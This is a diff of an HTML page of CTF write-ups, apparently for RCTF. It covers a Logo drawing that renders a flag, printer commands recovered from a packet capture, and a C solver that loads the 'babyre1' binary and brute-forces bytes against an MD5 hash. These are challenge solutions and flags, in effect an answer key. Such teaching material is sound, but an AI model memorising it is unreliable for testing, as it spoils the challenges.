@@ -146,6 +146,8 @@
               <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                 <a class="dropdown-item" href="#babyre1">babyre1</a>
     
+                <a class="dropdown-item" href="#babyre2">babyre2</a>
+    
                 <a class="dropdown-item" href="#asm">asm</a>
     
                 <a class="dropdown-item" href="#donteatme">donteatme</a>
@@ -189,6 +191,8 @@
                 <a class="dropdown-item" href="#manynotes">manynotes</a>
     
                 <a class="dropdown-item" href="#shellcoder">shellcoder</a>
+    
+                <a class="dropdown-item" href="#syscall_interface">syscall_interface</a>
     
                 <a class="dropdown-item" href="#chat">chat</a>
     
@@ -236,6 +240,10 @@
           <div id="submenu1" class="collapse sidebar-submenu">
             <a href="#babyre1" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">babyre1</span>
+            </a>
+    
+<a href="#babyre2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyre2</span>
             </a>
     
 <a href="#asm" class="list-group-item list-group-item-action text-white bg-dark">
@@ -308,6 +316,10 @@
               <span class="menu-collapsed">shellcoder</span>
             </a>
     
+<a href="#syscall_interface" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">syscall_interface</span>
+            </a>
+    
 <a href="#chat" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">chat</span>
             </a>
@@ -321,7 +333,8 @@
 
 <h2 id="misc"><a class="header-link" href="#misc"></a>MISC</h2>
 <h3 id="draw"><a class="header-link" href="#draw"></a>draw</h3>
-<pre class="hljs"><code>cs pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">500</span> rt <span class="hljs-number">90</span> pd fd <span class="hljs-number">100</span> rt <span class="hljs-number">90</span> repeat <span class="hljs-number">18</span>[fd <span class="hljs-number">5</span> rt <span class="hljs-number">10</span>] lt <span class="hljs-number">135</span> fd <span class="hljs-number">50</span> lt <span class="hljs-number">135</span> pu bk <span class="hljs-number">100</span> pd setcolor pick [ red orange yellow green blue violet ] repeat <span class="hljs-number">18</span>[fd <span class="hljs-number">5</span> rt <span class="hljs-number">10</span>] rt <span class="hljs-number">90</span> fd <span class="hljs-number">60</span> rt <span class="hljs-number">90</span> bk <span class="hljs-number">30</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">60</span> pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> setcolor pick [ red orange yellow green blue violet ] lt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pu fd <span class="hljs-number">50</span> pd fd <span class="hljs-number">25</span> bk <span class="hljs-number">50</span> fd <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pu setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">100</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">30</span> rt <span class="hljs-number">45</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> bk <span class="hljs-number">100</span> fd <span class="hljs-number">50</span> rt <span class="hljs-number">45</span> pu fd <span class="hljs-number">50</span> lt <span class="hljs-number">90</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">50</span> pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd fd <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> bk <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> bk <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> setcolor pick [ red orange yellow green blue violet ] pu fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> bk <span class="hljs-number">30</span> pd rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> pu fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> bk <span class="hljs-number">50</span> pu bk <span class="hljs-number">100</span> lt <span class="hljs-number">90</span> setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">100</span> pd rt <span class="hljs-number">90</span> arc <span class="hljs-number">360</span> <span class="hljs-number">20</span> pu rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pd arc <span class="hljs-number">360</span> <span class="hljs-number">15</span> pu fd <span class="hljs-number">15</span> setcolor pick [ red orange yellow green blue violet ] lt <span class="hljs-number">90</span> pd bk <span class="hljs-number">50</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> pu home bk <span class="hljs-number">100</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd arc <span class="hljs-number">360</span> <span class="hljs-number">20</span> pu home</code></pre><p>use <code>https://www.calormen.com/jslogo/</code> then you can get the flag easily.</p>
+<pre class="hljs"><code>cs pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">500</span> rt <span class="hljs-number">90</span> pd fd <span class="hljs-number">100</span> rt <span class="hljs-number">90</span> repeat <span class="hljs-number">18</span>[fd <span class="hljs-number">5</span> rt <span class="hljs-number">10</span>] lt <span class="hljs-number">135</span> fd <span class="hljs-number">50</span> lt <span class="hljs-number">135</span> pu bk <span class="hljs-number">100</span> pd setcolor pick [ red orange yellow green blue violet ] repeat <span class="hljs-number">18</span>[fd <span class="hljs-number">5</span> rt <span class="hljs-number">10</span>] rt <span class="hljs-number">90</span> fd <span class="hljs-number">60</span> rt <span class="hljs-number">90</span> bk <span class="hljs-number">30</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">60</span> pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> setcolor pick [ red orange yellow green blue violet ] lt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pu fd <span class="hljs-number">50</span> pd fd <span class="hljs-number">25</span> bk <span class="hljs-number">50</span> fd <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pu setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">100</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">30</span> rt <span class="hljs-number">45</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> bk <span class="hljs-number">100</span> fd <span class="hljs-number">50</span> rt <span class="hljs-number">45</span> pu fd <span class="hljs-number">50</span> lt <span class="hljs-number">90</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">50</span> pu lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd fd <span class="hljs-number">50</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> bk <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> bk <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> setcolor pick [ red orange yellow green blue violet ] pu fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> bk <span class="hljs-number">30</span> pd rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> pu fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> pd fd <span class="hljs-number">50</span> bk <span class="hljs-number">25</span> rt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> bk <span class="hljs-number">50</span> pu bk <span class="hljs-number">100</span> lt <span class="hljs-number">90</span> setcolor pick [ red orange yellow green blue violet ] fd <span class="hljs-number">100</span> pd rt <span class="hljs-number">90</span> arc <span class="hljs-number">360</span> <span class="hljs-number">20</span> pu rt <span class="hljs-number">90</span> fd <span class="hljs-number">50</span> pd arc <span class="hljs-number">360</span> <span class="hljs-number">15</span> pu fd <span class="hljs-number">15</span> setcolor pick [ red orange yellow green blue violet ] lt <span class="hljs-number">90</span> pd bk <span class="hljs-number">50</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">25</span> pu home bk <span class="hljs-number">100</span> lt <span class="hljs-number">90</span> fd <span class="hljs-number">100</span> pd arc <span class="hljs-number">360</span> <span class="hljs-number">20</span> pu home
+</code></pre><p>use <code>https://www.calormen.com/jslogo/</code> then you can get the flag easily.</p>
 <h3 id="printer"><a class="header-link" href="#printer"></a>printer</h3>
 <ul class="list">
 <li>First, Pull out the no.675 packet in <code>Printer.pcapng</code></li>
@@ -331,6 +344,8 @@
 </ul>
 </li>
 <li><p>there&#39;s two parts in the flag</p>
+</li>
+</ul>
 <pre class="hljs"><code>BAR <span class="hljs-number">348</span>, <span class="hljs-number">439</span>, <span class="hljs-number">2</span>, <span class="hljs-number">96</span>
 BAR <span class="hljs-number">292</span>, <span class="hljs-number">535</span>, <span class="hljs-number">56</span>, <span class="hljs-number">2</span>
 BAR <span class="hljs-number">300</span>, <span class="hljs-number">495</span>, <span class="hljs-number">48</span>, <span class="hljs-number">2</span>
@@ -381,7 +396,8 @@ BAR <span class="hljs-number">184</span>, <span class="hljs-number">351</span>, 
 BAR <span class="hljs-number">168</span>, <span class="hljs-number">351</span>, <span class="hljs-number">16</span>, <span class="hljs-number">2</span>
 BAR <span class="hljs-number">168</span>, <span class="hljs-number">311</span>, <span class="hljs-number">2</span>, <span class="hljs-number">40</span>
 BAR <span class="hljs-number">152</span>, <span class="hljs-number">351</span>, <span class="hljs-number">16</span>, <span class="hljs-number">2</span>
-BAR <span class="hljs-number">152</span>, <span class="hljs-number">351</span>, <span class="hljs-number">2</span>, <span class="hljs-number">16</span></code></pre></li>
+BAR <span class="hljs-number">152</span>, <span class="hljs-number">351</span>, <span class="hljs-number">2</span>, <span class="hljs-number">16</span>
+</code></pre><ul class="list">
 <li><p>draw this first with canvus you&#39;ll get flag part 1.
 <img src="https://i.imgur.com/A0nxNIG.png" alt=""></p>
 </li>
@@ -390,9 +406,11 @@ BAR <span class="hljs-number">152</span>, <span class="hljs-number">351</span>, 
 </ul>
 <pre class="hljs"><code>BITMAP 138,75,26,48,1
 
-ffffffffffffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffffffffffffffc3ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffe3fffe1ffffffffff807c03c603<span class="hljs-built_in">fc</span>07c07e0007f7ff01f8067ff007ff803<span class="hljs-built_in">fc</span>07c03fff1ff1f04f8ff1ff1fff1fff3ffcff1f27<span class="hljs-built_in">fc</span>7f1ff3e1ff1ff9ffff1ff1<span class="hljs-built_in">fc</span>1fcff8ff1fff1fff3ffefe3f87f8ff9feff8ff1ff9ffff8ff1<span class="hljs-built_in">fc</span>3<span class="hljs-built_in">fc</span>7fcff1fff1fff1ffefc7<span class="hljs-built_in">fc</span>7f9ff8fdffc7f1ff9ffff8ff1<span class="hljs-built_in">fc</span>7fe3<span class="hljs-built_in">fc</span>7f1fff1fff1ffefcffe7f1ff8f9ffc3f1ff9ffffc7f1<span class="hljs-built_in">fc</span>7fe3fe3f1fff1fff0ffef8ffe7f1ff0fbffe3f1ff9ffffc7f1<span class="hljs-built_in">fc</span>7fe3fe3f1fff1fff0ffef8ffe7e1ff8f3ffe3f1ff9ffffe3f1<span class="hljs-built_in">fc</span>7fe3ff1f1fff1fff47fef8ffe7e3ff9f7ffe1f1ff9ffffe3f1<span class="hljs-built_in">fc</span>7ff3ff8e1fff1fff47fef9ffe7e3ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7ff3ff8c1fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7ff3ffc11fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7fe3ffe31fff1fff71fef9ffe7f1ffffffff1f1ff9fffff8f1<span class="hljs-built_in">fc</span>7fe3ffe71fff1fff71fef8ffe7f8ffffffff0f1ff9fffff8f1<span class="hljs-built_in">fc</span>7fe3ffcf1fff1fff78fef8ffe7fcffffffff0f1ff9fffffc61<span class="hljs-built_in">fc</span>7fe7ff9f1fff1fff78fef8ffc7fe3fffffff0f1ff9fffffc41<span class="hljs-built_in">fc</span>7<span class="hljs-built_in">fc</span>7ff3f1fff1fff7c7efcffc7ff83ffffff0f9ff1fffffe11<span class="hljs-built_in">fc</span>3f8fff7f1fff1fff7c7efc7fa7ff87ffffff0f9fe9fffffe31<span class="hljs-built_in">fc</span>1f1ffe7f1fff1fff7e3efe3e67fe3fffffff1f8f99ffffff31<span class="hljs-built_in">fc</span>403fe01f1fff1fff7e3eff80e0<span class="hljs-built_in">fc</span>7fffffff1<span class="hljs-built_in">fc</span>039fffffe71<span class="hljs-built_in">fc</span>79ffffff1fff1fff7f1efff3eff8ffffffff1ff0f9fffffef1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f0efffffff8ffffffff1ffff9fffffcf1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f8efffffff8fffffffe1ffff9fffff9f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f86fffffff8ff9f7ffe3ffff9fffffbf1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7<span class="hljs-built_in">fc</span>6fffffff8ff0f3ffe3ffff9fffff7f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7<span class="hljs-built_in">fc</span>2fffffff8ff8fbffc7ffff9ffffe7f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7fe2fffffff8ff8f9ffc7ffff9ffffcff1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7ff0fffffffcff9f9ff8fffff9ffff8ff1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7ff0fffffffc7f9f8ff1fffff9ffff0ff0<span class="hljs-built_in">fc</span>3fffffff1fff0ffe7ff8fffffffe1e7f83e3fffff8fffc03c03c0fffffff03e000780ff83fffffff80fff80ffffff83ffffffffdffffffff3ffffffffffffffffffffffffffffffffbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</code></pre><pre class="hljs"><code>BITMAP <span class="hljs-number">130</span>,<span class="hljs-number">579</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>
+ffffffffffffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffffffffffffffc3ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffffffffffffffffffffffffffffffffffffffffffffffffffe7ffe3fffe1ffffffffff807c03c603<span class="hljs-built_in">fc</span>07c07e0007f7ff01f8067ff007ff803<span class="hljs-built_in">fc</span>07c03fff1ff1f04f8ff1ff1fff1fff3ffcff1f27<span class="hljs-built_in">fc</span>7f1ff3e1ff1ff9ffff1ff1<span class="hljs-built_in">fc</span>1fcff8ff1fff1fff3ffefe3f87f8ff9feff8ff1ff9ffff8ff1<span class="hljs-built_in">fc</span>3<span class="hljs-built_in">fc</span>7fcff1fff1fff1ffefc7<span class="hljs-built_in">fc</span>7f9ff8fdffc7f1ff9ffff8ff1<span class="hljs-built_in">fc</span>7fe3<span class="hljs-built_in">fc</span>7f1fff1fff1ffefcffe7f1ff8f9ffc3f1ff9ffffc7f1<span class="hljs-built_in">fc</span>7fe3fe3f1fff1fff0ffef8ffe7f1ff0fbffe3f1ff9ffffc7f1<span class="hljs-built_in">fc</span>7fe3fe3f1fff1fff0ffef8ffe7e1ff8f3ffe3f1ff9ffffe3f1<span class="hljs-built_in">fc</span>7fe3ff1f1fff1fff47fef8ffe7e3ff9f7ffe1f1ff9ffffe3f1<span class="hljs-built_in">fc</span>7ff3ff8e1fff1fff47fef9ffe7e3ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7ff3ff8c1fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7ff3ffc11fff1fff63fef9ffe7f1ffffffff1f1ff9fffff1f1<span class="hljs-built_in">fc</span>7fe3ffe31fff1fff71fef9ffe7f1ffffffff1f1ff9fffff8f1<span class="hljs-built_in">fc</span>7fe3ffe71fff1fff71fef8ffe7f8ffffffff0f1ff9fffff8f1<span class="hljs-built_in">fc</span>7fe3ffcf1fff1fff78fef8ffe7fcffffffff0f1ff9fffffc61<span class="hljs-built_in">fc</span>7fe7ff9f1fff1fff78fef8ffc7fe3fffffff0f1ff9fffffc41<span class="hljs-built_in">fc</span>7<span class="hljs-built_in">fc</span>7ff3f1fff1fff7c7efcffc7ff83ffffff0f9ff1fffffe11<span class="hljs-built_in">fc</span>3f8fff7f1fff1fff7c7efc7fa7ff87ffffff0f9fe9fffffe31<span class="hljs-built_in">fc</span>1f1ffe7f1fff1fff7e3efe3e67fe3fffffff1f8f99ffffff31<span class="hljs-built_in">fc</span>403fe01f1fff1fff7e3eff80e0<span class="hljs-built_in">fc</span>7fffffff1<span class="hljs-built_in">fc</span>039fffffe71<span class="hljs-built_in">fc</span>79ffffff1fff1fff7f1efff3eff8ffffffff1ff0f9fffffef1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f0efffffff8ffffffff1ffff9fffffcf1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f8efffffff8fffffffe1ffff9fffff9f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7f86fffffff8ff9f7ffe3ffff9fffffbf1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7<span class="hljs-built_in">fc</span>6fffffff8ff0f3ffe3ffff9fffff7f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7<span class="hljs-built_in">fc</span>2fffffff8ff8fbffc7ffff9ffffe7f1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7fe2fffffff8ff8f9ffc7ffff9ffffcff1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7ff0fffffffcff9f9ff8fffff9ffff8ff1<span class="hljs-built_in">fc</span>7fffffff1fff1fff7ff0fffffffc7f9f8ff1fffff9ffff0ff0<span class="hljs-built_in">fc</span>3fffffff1fff0ffe7ff8fffffffe1e7f83e3fffff8fffc03c03c0fffffff03e000780ff83fffffff80fff80ffffff83ffffffffdffffffff3ffffffffffffffffffffffffffffffffbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</code></pre><pre class="hljs"><code>BITMAP <span class="hljs-number">130</span>,<span class="hljs-number">579</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>
 
-ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc7fffffffffffffffffffffffffffffffffffffffffffffffffffffffe38fffffffffffffffffffffffffffffffffffffffffffffffffffffffdff7ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3fffffffffffff9ffefbffc7ffffffe1fff8fffffffc3ffffffffff9ff3ff8ffffffffff0ffefbff39ff007f9c7fe72ffffff3c3fc07fffff87e78463f803ff01f0ffe7bfefefff7ff3f3f9f8fffffeff3ffbffffffc01fa3f9ffbfffe7f9ffe71fcfe7ff7ff7f9f9fcfffffeffbffbfffffffc07e7f9ffbfffe7ffffc71f9ff3ff7feff9f3fcfffffeffbffbffffffffe7e7f8ffbfffe7ffffd75f9ff3ff7ffffcf3fcfffffe7ffffbffffffffe7e7f9ffbfffe7ffffd35f9ff3ff7ffffcf3fcfffffe3ffffbfffffff80fe7f9ffbfffe7ffffd2cf9ff3ff7ffffcf3fcffffff07fffbfffffff7cfe7f3ffbfffe7ffffb2cf9ff3ff7fe000f3fcffffffc1fffbffffffe7e7e7c7ffbfffe7ffffbacf9ff3ff7fe7fcf3fcfffffff87ffbffffffe7e7e03fffbfffe7ffffb9ef9ff3ff7fe7fcf3fcfffffffe7ffbffffffefe7e7ffffbfffe7ffffb9e79ff3ff7fe7f9f3fcfffffeff3ffbffffffefe7e7f9ffbfffe7ffff79e7cfe7ff7ff3f9f9f8fffffeff3ffbffffffe7e7f7f1ffbfffe7f1ff79e7efcfff7ff3f3f9f0fffffe7f7ffbffffff27eff3f3ffbfffe7f0fe38e3f39fff7ffce7fc04fffffe1cfff9ffffff019ff9e7ffbfffe7f1fffffffc7fff7fff1fffbcfffffee3fff87fffffbe7ffe1fffbffe00ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfe7e7ffffffffffffff7ffffffffcfffffffffff3ffffffffffffffffbfe7efffffffffffffff7ffffffffcfffffffffff1ffffffffffffffffbfe7cfffffffffffffff03fffffffc3ffffffffff1ffffffffffffffff81f03fffffffffffffff3ffffffffcfffffffffffbffffffffffffffff9ffffff</code></pre><ul class="list">
+ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc7fffffffffffffffffffffffffffffffffffffffffffffffffffffffe38fffffffffffffffffffffffffffffffffffffffffffffffffffffffdff7ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3ffffffffffffffffffffffffffffffffffffffffffffffffffffff9ff3fffffffffffff9ffefbffc7ffffffe1fff8fffffffc3ffffffffff9ff3ff8ffffffffff0ffefbff39ff007f9c7fe72ffffff3c3fc07fffff87e78463f803ff01f0ffe7bfefefff7ff3f3f9f8fffffeff3ffbffffffc01fa3f9ffbfffe7f9ffe71fcfe7ff7ff7f9f9fcfffffeffbffbfffffffc07e7f9ffbfffe7ffffc71f9ff3ff7feff9f3fcfffffeffbffbffffffffe7e7f8ffbfffe7ffffd75f9ff3ff7ffffcf3fcfffffe7ffffbffffffffe7e7f9ffbfffe7ffffd35f9ff3ff7ffffcf3fcfffffe3ffffbfffffff80fe7f9ffbfffe7ffffd2cf9ff3ff7ffffcf3fcffffff07fffbfffffff7cfe7f3ffbfffe7ffffb2cf9ff3ff7fe000f3fcffffffc1fffbffffffe7e7e7c7ffbfffe7ffffbacf9ff3ff7fe7fcf3fcfffffff87ffbffffffe7e7e03fffbfffe7ffffb9ef9ff3ff7fe7fcf3fcfffffffe7ffbffffffefe7e7ffffbfffe7ffffb9e79ff3ff7fe7f9f3fcfffffeff3ffbffffffefe7e7f9ffbfffe7ffff79e7cfe7ff7ff3f9f9f8fffffeff3ffbffffffe7e7f7f1ffbfffe7f1ff79e7efcfff7ff3f3f9f0fffffe7f7ffbffffff27eff3f3ffbfffe7f0fe38e3f39fff7ffce7fc04fffffe1cfff9ffffff019ff9e7ffbfffe7f1fffffffc7fff7fff1fffbcfffffee3fff87fffffbe7ffe1fffbffe00ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfffe7ffffffffffffff7ffffffffcffffffffffffffffffffffffffffbfe7e7ffffffffffffff7ffffffffcfffffffffff3ffffffffffffffffbfe7efffffffffffffff7ffffffffcfffffffffff1ffffffffffffffffbfe7cfffffffffffffff03fffffffc3ffffffffff1ffffffffffffffff81f03fffffffffffffff3ffffffffcfffffffffffbffffffffffffffff9ffffff
+</code></pre><ul class="list">
 <li>convert the hex data to binary data then you&#39;ll get the flag part 2.</li>
 </ul>
 <p><img src="https://i.imgur.com/ESBAAWp.png" alt="">
@@ -404,55 +422,59 @@ ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
 <h3 id="babyre1"><a class="header-link" href="#babyre1"></a>babyre1</h3>
 <ul class="list">
 <li>Our input will do some magic operation to become <code>Bingo!</code> if it matches the correct input</li>
-<li>Reverse from <code>Bingo!</code> to flag
-<code>`</code>c=
-#include &lt;dlfcn.h&gt;
-#include &lt;string.h&gt;
-#include &lt;openssl/md5.h&gt;</li>
+<li>Reverse from <code>Bingo!</code> to flag</li>
 </ul>
-<p>char<em> data=&quot;0123456789abcdef&quot;;
-unsigned char out[MD5_DIGEST_LENGTH];
-int main(int argc,char<strong> argv){
-    char</strong> handle=dlopen(&quot;./babyre&quot;,RTLD_LAZY);
-    char</em> code = <em>handle;
-    void (</em>change)(char<em>,int,char</em>);<br>    change = code+0xce0;
-    unsigned char buf[]=&quot;Bingo!\x00\x00&quot;;
-    for(int i=0,e=strlen(buf);i&lt;e;i++){
-        buf[i]^=0x17;
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/md5.h&gt;</span></span>
+
+<span class="hljs-keyword">char</span>* data=<span class="hljs-string">"0123456789abcdef"</span>;
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> out[MD5_DIGEST_LENGTH];
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span>** argv)</span></span>{
+    <span class="hljs-keyword">char</span>** handle=dlopen(<span class="hljs-string">"./babyre"</span>,RTLD_LAZY);
+    <span class="hljs-keyword">char</span>* code = *handle;
+    <span class="hljs-keyword">void</span> (*change)(<span class="hljs-keyword">char</span>*,<span class="hljs-keyword">int</span>,<span class="hljs-keyword">char</span>*);        
+    change = code+<span class="hljs-number">0xce0</span>;
+    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[]=<span class="hljs-string">"Bingo!\x00\x00"</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,e=<span class="hljs-built_in">strlen</span>(buf);i&lt;e;i++){
+        buf[i]^=<span class="hljs-number">0x17</span>;
     }
-    buf[6] = 0x2; // bruteforce 0~255 to match md5
-    buf[7] = 0x2;
-    change(buf,2,code+0x202010);
-    char sol[0x17]=&quot;rctf{aaaaaaaaaaaaaaaa}&quot;;
-    for(int i=0;i&lt;8;i++){
-        int a = buf[i]&gt;&gt;4;
-        int b = buf[i]&0xf;
-        sol[5+i<em>2+0]=data[a];
-        sol[5+i</em>2+1]=data[b];
+    buf[<span class="hljs-number">6</span>] = <span class="hljs-number">0x2</span>; <span class="hljs-comment">// bruteforce 0~255 to match md5</span>
+    buf[<span class="hljs-number">7</span>] = <span class="hljs-number">0x2</span>;
+    change(buf,<span class="hljs-number">2</span>,code+<span class="hljs-number">0x202010</span>);
+    <span class="hljs-keyword">char</span> sol[<span class="hljs-number">0x17</span>]=<span class="hljs-string">"rctf{aaaaaaaaaaaaaaaa}"</span>;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i++){
+        <span class="hljs-keyword">int</span> a = buf[i]&gt;&gt;<span class="hljs-number">4</span>;
+        <span class="hljs-keyword">int</span> b = buf[i]&amp;<span class="hljs-number">0xf</span>;
+        sol[<span class="hljs-number">5</span>+i*<span class="hljs-number">2</span>+<span class="hljs-number">0</span>]=data[a];
+        sol[<span class="hljs-number">5</span>+i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>]=data[b];
     }
     MD5_CTX c;
     MD5_Init(&amp;c);
-    MD5_Update(&amp;c,sol,0x16);
+    MD5_Update(&amp;c,sol,<span class="hljs-number">0x16</span>);
     MD5_Final(out, &amp;c);
-    puts(sol);</p>
-<pre class="hljs"><code>// <span class="hljs-symbol">MD5</span> <span class="hljs-built_in">match</span> <span class="hljs-number">5</span>f8243a662cf71bf31d2b2602638dc1d
